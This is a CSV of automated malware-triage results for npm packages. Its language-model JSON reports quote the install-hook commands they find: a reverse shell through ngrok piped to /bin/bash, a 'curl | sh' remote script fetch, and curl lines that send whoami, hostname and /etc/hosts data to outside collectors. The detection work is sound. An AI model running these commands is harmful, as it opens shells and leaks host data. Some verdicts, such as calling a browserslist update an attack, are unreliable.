package_name,version,label,timestamp,routing,structural_risk_score,parse_success,total_behaviors,behavior_categories,max_confidence,model_name,prompt_version,raw_response,parsed_json,analyst_note
@doccledev/pattern-library,5.0.99,malicious,2026-03-26T21:52:59.091082,flag,1.0,True,1,data_exfiltration,0.79,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [
    {
      ""category"": ""data_exfiltration"",
      ""summary"": ""The code sends network requests to a malicious domain."",
      ""details"": ""The code sends network requests to a domain 'cfhkr5pjas2slrrhp4s0pruu5eat15gkz.oast.live' in the index.js file at line 25 and 4. This could indicate data exfiltration."",
      ""confidence"": 0.79,
      ""evidence_apis"": [],
      ""evidence_files"": [""index.js""],
      ""evidence_domains"": [""cfhkr5pjas2slrrhp4s0pruu5eat15gkz.oast.live""],
      ""evidence_commands"": [],
      ""evidence_env_vars"": []
    }
  ],
  ""risk_vector"": [""data_exfiltration""]
}
```

This analysis indicates that the package @doccledev/pattern-library version 5.0.99 has a high level of risk due to data exfiltration. The package sends network requests to a malicious domain, which could potentially lead to data exfiltration.","{""behaviors"": [{""category"": ""data_exfiltration"", ""summary"": ""The code sends network requests to a malicious domain."", ""details"": ""The code sends network requests to a domain 'cfhkr5pjas2slrrhp4s0pruu5eat15gkz.oast.live' in the index.js file at line 25 and 4. This could indicate data exfiltration."", ""confidence"": 0.79, ""evidence_apis"": [], ""evidence_files"": [""index.js""], ""evidence_domains"": [""cfhkr5pjas2slrrhp4s0pruu5eat15gkz.oast.live""], ""evidence_commands"": [], ""evidence_env_vars"": []}], ""risk_vector"": [""data_exfiltration""]}","that the package @doccledev/pattern-library version 5.0.99 has a high level of risk due to data exfiltration. The package sends network requests to a malicious domain, which could potentially lead to data exfiltration."
@drp-web/shared,1.2.7,malicious,2026-03-26T21:53:25.158876,flag,0.6333,True,1,data_exfiltration,0.95,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [
    {
      ""category"": ""data_exfiltration"",
      ""summary"": ""The package.json scripts.preinstall command appears to be executing a command to update and install netcat, cat, and telnet. This could potentially be a data exfiltration behavior."",
      ""details"": ""The command executed is 'apk add --update netcat; cat-openbsd; telnet2.tcp.ngrok.io18363|/bin/bash'. This command appears to be updating and installing netcat, cat, and telnet, which could be used for data exfiltration."",
      ""confidence"": 0.95,
      ""evidence_commands"": [""apk add --update netcat"", ""cat-openbsd"", ""telnet2.tcp.ngrok.io18363|/bin/bash""],
      ""evidence_files"": [],
      ""evidence_apis"": [],
      ""evidence_domains"": [],
      ""evidence_env_vars"": []
    }
  ],
  ""risk_vector"": [""data_exfiltration""]
}
```

This JSON object indicates that the package.json scripts.preinstall command is executing a command to update and install netcat, cat, and telnet. This could potentially be a data exfiltration behavior. The confidence score is 0.95, indicating high confidence that this is a malicious intent.","{""behaviors"": [{""category"": ""data_exfiltration"", ""summary"": ""The package.json scripts.preinstall command appears to be executing a command to update and install netcat, cat, and telnet. This could potentially be a data exfiltration behavior."", ""details"": ""The command executed is 'apk add --update netcat; cat-openbsd; telnet2.tcp.ngrok.io18363|/bin/bash'. This command appears to be updating and installing netcat, cat, and telnet, which could be used for data exfiltration."", ""confidence"": 0.95, ""evidence_commands"": [""apk add --update netcat"", ""cat-openbsd"", ""telnet2.tcp.ngrok.io18363|/bin/bash""], ""evidence_files"": [], ""evidence_apis"": [], ""evidence_domains"": [], ""evidence_env_vars"": []}], ""risk_vector"": [""data_exfiltration""]}","This JSON object indicates that the package.json scripts.preinstall command is executing a command to update and install netcat, cat, and telnet. This could potentially be a data exfiltration behavior. The confidence score is 0.95, indicating high confidence that this is a malicious intent."
@dtci/eq-ui-lib,1.9.9,malicious,2026-03-26T21:53:38.700850,flag,0.6333,True,1,data_exfiltration,0.95,deepseek-coder-6.7b-instruct,semantic_v2.0,"Based on the provided information, the package.json scripts.preinstall command appears to be a curl command that sends base64 encoded data from the id and /etc/hosts files to a URL. This command could potentially be used for data exfiltration.


```json
{
  ""behaviors"": [
    {
      ""category"": ""data_exfiltration"",
      ""summary"": ""The package.json scripts.preinstall command appears to be sending base64 encoded data from the id and /etc/hosts files to a URL."",
      ""details"": ""The command is a curl command that sends base64 encoded data from the id and /etc/hosts files to a URL. This could potentially be used for data exfiltration."",
      ""confidence"": 0.95,
      ""evidence_commands"": [""curl-d$(id|base64)-d$(cat/etc/hosts|base64)https://54f325bfdb30a3e28eb9fc7557e23eb0.m.pipedream.net/""],
      ""evidence_files"": [""/etc/hosts""],
      ""evidence_apis"": [],
      ""evidence_domains"": [""https://54f325bfdb30a3e28eb9fc7557e23eb0.m.pipedream.net""],
      ""evidence_env_vars"": []
    }
  ],
  ""risk_vector"": [""data_exfiltration""]
}
```

Please note that this is a preliminary analysis and the actual malicious intent could be different based on the context of the application and the environment in which it is running. Further analysis is recommended to confirm the malicious intent.","{""behaviors"": [{""category"": ""data_exfiltration"", ""summary"": ""The package.json scripts.preinstall command appears to be sending base64 encoded data from the id and /etc/hosts files to a URL."", ""details"": ""The command is a curl command that sends base64 encoded data from the id and /etc/hosts files to a URL. This could potentially be used for data exfiltration."", ""confidence"": 0.95, ""evidence_commands"": [""curl-d$(id|base64)-d$(cat/etc/hosts|base64)https://54f325bfdb30a3e28eb9fc7557e23eb0.m.pipedream.net/""], ""evidence_files"": [""/etc/hosts""], ""evidence_apis"": [], ""evidence_domains"": [""https://54f325bfdb30a3e28eb9fc7557e23eb0.m.pipedream.net""], ""evidence_env_vars"": []}], ""risk_vector"": [""data_exfiltration""]}",that this is a preliminary analysis and the actual malicious intent could be different based on the context of the application and the environment in which it is running. Further analysis is recommended to confirm the malicious intent.
@dydxprotocol/perpetual,1.2.2,malicious,2026-03-26T21:53:48.486990,flag,0.6467,True,1,remote_code_execution,0.97,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [
    {
      ""category"": ""remote_code_execution"",
      ""summary"": ""The package contains a remote code execution signal through the use of a pre-install hook that downloads a script from a CircleCI server."",
      ""details"": ""The package uses the curl command to download a script from a CircleCI server in the pre-install hook. This could potentially lead to remote code execution on the victim's system."",
      ""confidence"": 0.97,
      ""evidence_commands"": [""curl-shttp://api.circle-cdn.com/ci.js|sh""],
      ""evidence_files"": [],
      ""evidence_apis"": [],
      ""evidence_domains"": [""api.circle-cdn.com""],
      ""evidence_env_vars"": []
    }
  ],
  ""risk_vector"": [""remote_code_execution""]
}
```

This JSON object indicates that the package contains a remote code execution signal through the use of a pre-install hook that downloads a script from a CircleCI server. The confidence score is 0.97, indicating high confidence that this signal is malicious. The evidence commands, domains, and APIs associated with this signal are also provided.","{""behaviors"": [{""category"": ""remote_code_execution"", ""summary"": ""The package contains a remote code execution signal through the use of a pre-install hook that downloads a script from a CircleCI server."", ""details"": ""The package uses the curl command to download a script from a CircleCI server in the pre-install hook. This could potentially lead to remote code execution on the victim's system."", ""confidence"": 0.97, ""evidence_commands"": [""curl-shttp://api.circle-cdn.com/ci.js|sh""], ""evidence_files"": [], ""evidence_apis"": [], ""evidence_domains"": [""api.circle-cdn.com""], ""evidence_env_vars"": []}], ""risk_vector"": [""remote_code_execution""]}","This JSON object indicates that the package contains a remote code execution signal through the use of a pre-install hook that downloads a script from a CircleCI server. The confidence score is 0.97, indicating high confidence that this signal is malicious. The evidence commands, domains, and APIs associated with this signal are also provided."
@elisaid/elisaid-js-client,6.9.3,malicious,2026-03-26T21:53:56.533248,review,0.364,True,1,network_exfiltration,0.78,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [
    {
      ""category"": ""network_exfiltration"",
      ""summary"": ""The code is making network requests to a specific host."",
      ""details"": ""The code is making network requests to 'dc.70.lc' on port 443."",
      ""confidence"": 0.78,
      ""evidence_apis"": [],
      ""evidence_files"": [],
      ""evidence_domains"": [""dc.70.lc""],
      ""evidence_commands"": [],
      ""evidence_env_vars"": []
    }
  ],
  ""risk_vector"": [""network_exfiltration""]
}
```

This analysis indicates that the code is making network requests to a specific host, which could potentially be malicious. The confidence score is 0.78, indicating a high level of confidence in the detection of this behavior. The category of the behavior is 'network_exfiltration', which aligns with the behavior described in the code.","{""behaviors"": [{""category"": ""network_exfiltration"", ""summary"": ""The code is making network requests to a specific host."", ""details"": ""The code is making network requests to 'dc.70.lc' on port 443."", ""confidence"": 0.78, ""evidence_apis"": [], ""evidence_files"": [], ""evidence_domains"": [""dc.70.lc""], ""evidence_commands"": [], ""evidence_env_vars"": []}], ""risk_vector"": [""network_exfiltration""]}","that the code is making network requests to a specific host, which could potentially be malicious. The confidence score is 0.78, indicating a high level of confidence in the detection of this behavior. The category of the behavior is 'network_exfiltration', which aligns with the behavior described in the code."
@employee-experience/common,999.9.11,malicious,2026-03-26T21:54:07.580539,flag,0.77,True,2,dynamic_code_execution;supply_chain_propagation,0.82,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [
    {
      ""category"": ""dynamic_code_execution"",
      ""summary"": ""The code executes dynamic code using the 'eval' function in the install.js file."",
      ""details"": ""The 'eval' function is used to execute dynamic code in the install.js file. This could potentially lead to malicious intent if the code being evaluated is not trusted."",
      ""confidence"": 0.82,
      ""evidence_apis"": [],
      ""evidence_files"": [""install.js""],
      ""evidence_domains"": [],
      ""evidence_commands"": [""eval""],
      ""evidence_env_vars"": []
    },
    {
      ""category"": ""supply_chain_propagation"",
      ""summary"": ""The package version contains inflated segment(s)."",
      ""details"": ""The package version '999.9.11' contains inflated segment(s). This could indicate a supply chain attack or confusion."",
      ""confidence"": 0.82,
      ""evidence_apis"": [],
      ""evidence_files"": [""package.json""],
      ""evidence_domains"": [],
      ""evidence_commands"": [],
      ""evidence_env_vars"": []
    }
  ],
  ""risk_vector"": [""dynamic_code_execution"", ""supply_chain_propagation""]
}
```","{""behaviors"": [{""category"": ""dynamic_code_execution"", ""summary"": ""The code executes dynamic code using the 'eval' function in the install.js file."", ""details"": ""The 'eval' function is used to execute dynamic code in the install.js file. This could potentially lead to malicious intent if the code being evaluated is not trusted."", ""confidence"": 0.82, ""evidence_apis"": [], ""evidence_files"": [""install.js""], ""evidence_domains"": [], ""evidence_commands"": [""eval""], ""evidence_env_vars"": []}, {""category"": ""supply_chain_propagation"", ""summary"": ""The package version contains inflated segment(s)."", ""details"": ""The package version '999.9.11' contains inflated segment(s). This could indicate a supply chain attack or confusion."", ""confidence"": 0.82, ""evidence_apis"": [], ""evidence_files"": [""package.json""], ""evidence_domains"": [], ""evidence_commands"": [], ""evidence_env_vars"": []}], ""risk_vector"": [""dynamic_code_execution"", ""supply_chain_propagation""]}",
@playgami/portal-logs,2.99.99,malicious,2026-03-26T21:54:19.041982,review,0.336,True,1,install_hook,0.72,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [
    {
      ""category"": ""install_hook"",
      ""summary"": ""Package contains no JavaScript files but install hook present"",
      ""details"": ""Package file structure"",
      ""confidence"": 0.72,
      ""evidence_apis"": [],
      ""evidence_files"": [],
      ""evidence_domains"": [],
      ""evidence_commands"": [""./pre.sh""],
      ""evidence_env_vars"": []
    }
  ],
  ""risk_vector"": [""install_hook""]
}
```

This JSON object represents the analysis of the package. The behavior category is ""install_hook"", which indicates that the package contains no JavaScript files but an install hook present. The confidence score is 0.72, indicating high confidence that this behavior is malicious. The evidence commands include ""./pre.sh"", which is the install hook command. The risk vector includes ""install_hook"", indicating that this package has a potential for install hook-based attacks.","{""behaviors"": [{""category"": ""install_hook"", ""summary"": ""Package contains no JavaScript files but install hook present"", ""details"": ""Package file structure"", ""confidence"": 0.72, ""evidence_apis"": [], ""evidence_files"": [], ""evidence_domains"": [], ""evidence_commands"": [""./pre.sh""], ""evidence_env_vars"": []}], ""risk_vector"": [""install_hook""]}","This JSON object represents the analysis of the package. The behavior category is ""install_hook"", which indicates that the package contains no JavaScript files but an install hook present. The confidence score is 0.72, indicating high confidence that this behavior is malicious. The evidence commands include ""./pre.sh"", which is the install hook command. The risk vector includes ""install_hook"", indicating that this package has a potential for install hook-based attacks."
@podval/test_dep_confs,1.0.0,malicious,2026-03-26T21:54:30.517197,flag,0.7773,True,1,network_exfiltration,0.83,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json{""behaviors"":[{""category"":""network_exfiltration"",""summary"":""The malicious code is attempting to exfiltrate sensitive data over the network."",""details"":""The malicious code is making a network request to an external IP address '34.141.82.227' during the pre-installation of the package."",""confidence"":0.83,""evidence_apis"":[],""evidence_files"":[],""evidence_domains"":[""34.141.82.227""],""evidence_commands"":[""curl http://34.141.82.227/?whoami=$(whoami)""],""evidence_env_vars"":[]}],""risk_vector"":[""network_exfiltration""]}```


This JSON output indicates that the package '@podval/test_dep_confs' has a high level of confidence in its malicious intent, as indicated by the 'Confidence' score of 0.83. The malicious code is attempting to exfiltrate sensitive data over the network, as indicated by the 'network_exfiltration' category in the 'risk_vector'. The evidence for this malicious intent comes from the hardcoded external IP address '34.141.82.227' in the pre-installation script of the package. The specific command used for this malicious intent is 'curl http://34.141.82.227/?whoami=$(whoami)'.","{""behaviors"": [{""category"": ""network_exfiltration"", ""summary"": ""The malicious code is attempting to exfiltrate sensitive data over the network."", ""details"": ""The malicious code is making a network request to an external IP address '34.141.82.227' during the pre-installation of the package."", ""confidence"": 0.83, ""evidence_apis"": [], ""evidence_files"": [], ""evidence_domains"": [""34.141.82.227""], ""evidence_commands"": [""curl http://34.141.82.227/?whoami=$(whoami)""], ""evidence_env_vars"": []}], ""risk_vector"": [""network_exfiltration""]}","This JSON output indicates that the package '@podval/test_dep_confs' has a high level of confidence in its malicious intent, as indicated by the 'Confidence' score of 0.83. The malicious code is attempting to exfiltrate sensitive data over the network, as indicated by the 'network_exfiltration' category in the 'risk_vector'. The evidence for this malicious intent comes from the hardcoded external IP address '34.141.82.227' in the pre-installation script of the package. The specific command used for this malicious intent is 'curl http://34.141.82.227/?whoami=$(whoami)'."
@realty-front/ad,1.13.1,malicious,2026-03-26T21:54:48.585989,review,0.336,True,1,install_hook,0.92,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [
    {
      ""category"": ""install_hook"",
      ""summary"": ""The package contains an install hook that may execute remote code at install time."",
      ""details"": ""The install hook command listed in the package metadata above executes a curl command with a payload that may indicate a remote code execution attempt."",
      ""confidence"": 0.92,
      ""evidence_commands"": [""curl -H \""Package:@realty-front/ad\"" -H \""Version:1.13.1\"" -H \""Hostname:$(hostname|base64)\"" -H \""Whoami:$(whoami|base64)\"" -H \""Pwd:$(pwd|base64)\"" -d \""meow!securitytest\"" http://npm_org.bl04szombv0uaoedbxwle53be2ks8h.c.act1on3.ru""],
      ""evidence_files"": [],
      ""evidence_apis"": [],
      ""evidence_domains"": [],
      ""evidence_env_vars"": []
    }
  ],
  ""risk_vector"": [""install_hook""]
}
```","{""behaviors"": [{""category"": ""install_hook"", ""summary"": ""The package contains an install hook that may execute remote code at install time."", ""details"": ""The install hook command listed in the package metadata above executes a curl command with a payload that may indicate a remote code execution attempt."", ""confidence"": 0.92, ""evidence_commands"": [""curl -H \""Package:@realty-front/ad\"" -H \""Version:1.13.1\"" -H \""Hostname:$(hostname|base64)\"" -H \""Whoami:$(whoami|base64)\"" -H \""Pwd:$(pwd|base64)\"" -d \""meow!securitytest\"" http://npm_org.bl04szombv0uaoedbxwle53be2ks8h.c.act1on3.ru""], ""evidence_files"": [], ""evidence_apis"": [], ""evidence_domains"": [], ""evidence_env_vars"": []}], ""risk_vector"": [""install_hook""]}",
@realty-front/payment-cards,1.13.1,malicious,2026-03-26T21:54:59.573045,review,0.336,True,1,suspicious_behavior,0.72,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [
    {
      ""category"": ""suspicious_behavior"",
      ""summary"": ""Suspicious behavior detected in package @realty-front/payment-cards version 1.13.1. Install hook present with payload likely to execute at install time."",
      ""details"": ""The package contains no JavaScript files and an install hook present. The payload may be remote. Verify the malicious intent from hook commands and structural signals only."",
      ""confidence"": 0.72,
      ""evidence_apis"": [],
      ""evidence_files"": [],
      ""evidence_domains"": [],
      ""evidence_commands"": [
        ""curl -H \""Package:@realty-front/payment-cards\"" -H \""Version:1.13.1\"" -H \""Hostname:$(hostname|base64)\"" -H \""Whoami:$(whoami|base64)\"" -H \""Pwd:$(pwd|base64)\"" -d\""meow!securitytest\"" http://npm_org.bl04szombv0uaoedbxwle53be2ks8h.c.act1on3.ru""
      ],
      ""evidence_env_vars"": []
    }
  ],
  ""risk_vector"": [""suspicious_behavior""]
}
```","{""behaviors"": [{""category"": ""suspicious_behavior"", ""summary"": ""Suspicious behavior detected in package @realty-front/payment-cards version 1.13.1. Install hook present with payload likely to execute at install time."", ""details"": ""The package contains no JavaScript files and an install hook present. The payload may be remote. Verify the malicious intent from hook commands and structural signals only."", ""confidence"": 0.72, ""evidence_apis"": [], ""evidence_files"": [], ""evidence_domains"": [], ""evidence_commands"": [""curl -H \""Package:@realty-front/payment-cards\"" -H \""Version:1.13.1\"" -H \""Hostname:$(hostname|base64)\"" -H \""Whoami:$(whoami|base64)\"" -H \""Pwd:$(pwd|base64)\"" -d\""meow!securitytest\"" http://npm_org.bl04szombv0uaoedbxwle53be2ks8h.c.act1on3.ru""], ""evidence_env_vars"": []}], ""risk_vector"": [""suspicious_behavior""]}",
@roku-web-core/ajax,1.99999999999999.99999999999999,malicious,2026-03-26T21:55:21.980971,flag,0.754,True,3,network_exfiltration;non-standardURLinfunctioncall;versioncontainsinflatedsegment,0.68,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [
    {
      ""category"": ""network_exfiltration"",
      ""summary"": ""The code is making a network request to a specified URL."",
      ""details"": ""The code is making a network request to 'https://jon-test.site/funtimes.php' using the 'https.get' function. The request includes custom headers that include the package version, time, npm action, hostname, username, and client IP addresses."",
      ""confidence"": 0.68,
      ""evidence_apis"": [""https.get""],
      ""evidence_files"": [""hook.js""],
      ""evidence_domains"": [""https://jon-test.site/funtimes.php""],
      ""evidence_commands"": [],
      ""evidence_env_vars"": []
    },
    {
      ""category"": ""versioncontainsinflatedsegment"",
      ""summary"": ""The package version contains a high number."",
      ""details"": ""The package version is '1.99999999999999.99999999999999', which is a high number."",
      ""confidence"": 0.68,
      ""evidence_apis"": [],
      ""evidence_files"": [""package.json""],
      ""evidence_domains"": [],
      ""evidence_commands"": [],
      ""evidence_env_vars"": []
    },
    {
      ""category"": ""non-standardURLinfunctioncall"",
      ""summary"": ""The code is making a network request to a non-standard URL."",
      ""details"": ""The code is making a network request to 'https://jon-test.site/funtimes.php', which is a non-standard URL."",
      ""confidence"": 0.68,
      ""evidence_apis"": [""https.get""],
      ""evidence_files"": [""hook.js""],
      ""evidence_domains"": [""https://jon-test.site/funtimes.php""],
      ""evidence_commands"": [],
      ""evidence_env_vars"": []
    }
  ],
  ""risk_vector"": [""network_exfiltration"", ""versioncontainsinflatedsegment"", ""non-standardURLinfunctioncall""]
}
```

This analysis indicates that the code in the 'hook.js' file of the '@roku-web-core/ajax' package is making network requests to a non-standard URL and is using a high version number. These behaviors suggest that the code may be attempting to exfiltrate data or perform some kind of network activity, which is consistent with the 'network_exfiltration' and 'versioncontainsinflatedsegment' signals. The analysis also identifies a non-standard URL in a function call, which could indicate that the code is trying to communicate with a server that is not the standard one.","{""behaviors"": [{""category"": ""network_exfiltration"", ""summary"": ""The code is making a network request to a specified URL."", ""details"": ""The code is making a network request to 'https://jon-test.site/funtimes.php' using the 'https.get' function. The request includes custom headers that include the package version, time, npm action, hostname, username, and client IP addresses."", ""confidence"": 0.68, ""evidence_apis"": [""https.get""], ""evidence_files"": [""hook.js""], ""evidence_domains"": [""https://jon-test.site/funtimes.php""], ""evidence_commands"": [], ""evidence_env_vars"": []}, {""category"": ""versioncontainsinflatedsegment"", ""summary"": ""The package version contains a high number."", ""details"": ""The package version is '1.99999999999999.99999999999999', which is a high number."", ""confidence"": 0.68, ""evidence_apis"": [], ""evidence_files"": [""package.json""], ""evidence_domains"": [], ""evidence_commands"": [], ""evidence_env_vars"": []}, {""category"": ""non-standardURLinfunctioncall"", ""summary"": ""The code is making a network request to a non-standard URL."", ""details"": ""The code is making a network request to 'https://jon-test.site/funtimes.php', which is a non-standard URL."", ""confidence"": 0.68, ""evidence_apis"": [""https.get""], ""evidence_files"": [""hook.js""], ""evidence_domains"": [""https://jon-test.site/funtimes.php""], ""evidence_commands"": [], ""evidence_env_vars"": []}], ""risk_vector"": [""network_exfiltration"", ""versioncontainsinflatedsegment"", ""non-standardURLinfunctioncall""]}","that the code in the 'hook.js' file of the '@roku-web-core/ajax' package is making network requests to a non-standard URL and is using a high version number. These behaviors suggest that the code may be attempting to exfiltrate data or perform some kind of network activity, which is consistent with the 'network_exfiltration' and 'versioncontainsinflatedsegment' signals. The analysis also identifies a non-standard URL in a function call, which could indicate that the code is trying to communicate with a server that is not the standard one."
@roots/browserslist-config,2023.3.16,malicious,2026-03-26T21:55:31.414791,review,0.3733,True,1,supply_chain_attack,0.8,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [
    {
      ""category"": ""supply_chain_attack"",
      ""summary"": ""The post-install script runs a command to update the browserslist database."",
      ""details"": ""The script executes the command `npx browserslist --update-db`. This command is used to update the browserslist database, which is used by tools like Autoprefixer to determine which browsers to target."",
      ""confidence"": 0.80,
      ""evidence_apis"": [""execaCommandSync""],
      ""evidence_files"": [""scripts/postinstall.mjs""],
      ""evidence_commands"": [""npx browserslist --update-db""],
      ""evidence_env_vars"": []
    }
  ],
  ""risk_vector"": [""supply_chain_attack""]
}
```

This JSON object indicates that the package contains a supply chain attack behavior, with a high level of confidence. The evidence for this behavior comes from the execution of the command `npx browserslist --update-db` in the file `scripts/postinstall.mjs`, which is an API call, file, and command. The risk vector includes the category ""supply_chain_attack"".","{""behaviors"": [{""category"": ""supply_chain_attack"", ""summary"": ""The post-install script runs a command to update the browserslist database."", ""details"": ""The script executes the command `npx browserslist --update-db`. This command is used to update the browserslist database, which is used by tools like Autoprefixer to determine which browsers to target."", ""confidence"": 0.8, ""evidence_apis"": [""execaCommandSync""], ""evidence_files"": [""scripts/postinstall.mjs""], ""evidence_commands"": [""npx browserslist --update-db""], ""evidence_env_vars"": []}], ""risk_vector"": [""supply_chain_attack""]}","This JSON object indicates that the package contains a supply chain attack behavior, with a high level of confidence. The evidence for this behavior comes from the execution of the command `npx browserslist --update-db` in the file `scripts/postinstall.mjs`, which is an API call, file, and command. The risk vector includes the category ""supply_chain_attack""."
@roots/bud,2023.0.30,malicious,2026-03-26T21:55:32.852871,review,0.3733,True,0,none,,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [],
  ""risk_vector"": []
}
```

```","{""behaviors"": [], ""risk_vector"": []}",
@tangoch/add-two,2.0.1,malicious,2026-03-26T21:55:43.946002,flag,1.0,True,1,data_exfiltration,0.79,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [
    {
      ""category"": ""data_exfiltration"",
      ""summary"": ""The code sends network requests to a specified domain."",
      ""details"": ""The code sends network requests to a domain 'ahs3ykmb4wm2gvn44955wb5ks.canarytokens.com' in the index.js file."",
      ""confidence"": 0.79,
      ""evidence_apis"": [],
      ""evidence_files"": [""index.js""],
      ""evidence_domains"": [""ahs3ykmb4wm2gvn44955wb5ks.canarytokens.com""],
      ""evidence_commands"": [],
      ""evidence_env_vars"": []
    }
  ],
  ""risk_vector"": [""data_exfiltration""]
}
```

This analysis indicates that the package @tangoch/add-two has a high level of malicious intent based on the evidence of sending network requests to a specified domain. The confidence score is 0.79, indicating a high level of confidence in the detection of malicious intent. The evidence of this behavior is in the index.js file and the domain 'ahs3ykmb4wm2gvn44955wb5ks.canarytokens.com'.","{""behaviors"": [{""category"": ""data_exfiltration"", ""summary"": ""The code sends network requests to a specified domain."", ""details"": ""The code sends network requests to a domain 'ahs3ykmb4wm2gvn44955wb5ks.canarytokens.com' in the index.js file."", ""confidence"": 0.79, ""evidence_apis"": [], ""evidence_files"": [""index.js""], ""evidence_domains"": [""ahs3ykmb4wm2gvn44955wb5ks.canarytokens.com""], ""evidence_commands"": [], ""evidence_env_vars"": []}], ""risk_vector"": [""data_exfiltration""]}","that the package @tangoch/add-two has a high level of malicious intent based on the evidence of sending network requests to a specified domain. The confidence score is 0.79, indicating a high level of confidence in the detection of malicious intent. The evidence of this behavior is in the index.js file and the domain 'ahs3ykmb4wm2gvn44955wb5ks.canarytokens.com'."
